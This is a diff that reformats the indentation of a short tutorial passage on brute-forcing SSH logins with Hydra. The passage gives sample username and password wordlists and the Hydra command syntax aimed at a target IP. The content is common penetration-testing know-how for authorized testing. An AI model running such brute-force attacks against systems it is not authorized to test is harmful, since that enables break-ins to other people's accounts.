@@ -1,18 +1,19 @@
 1. **Prepare your wordlists.** Create or download text files containing potential usernames and passwords. For example:
     1. username.txt:
-```
-text
-root
-admin
-user
-test
-```
+        ```
+        text
+        root
+        admin
+        user
+        test
+        ```
     2. password.txt:
-```text
-password
-123456
-changeme
-qwerty```
+        ```text
+        password
+        123456
+        changeme
+        qwerty
+        ```
 2. **Construct the Hydra command.** The basic command syntax for SSH brute-forcing with Hydra is:
 
 ```hydra -L <userlist.txt> -P <passlist.txt> <target_ip> ssh```
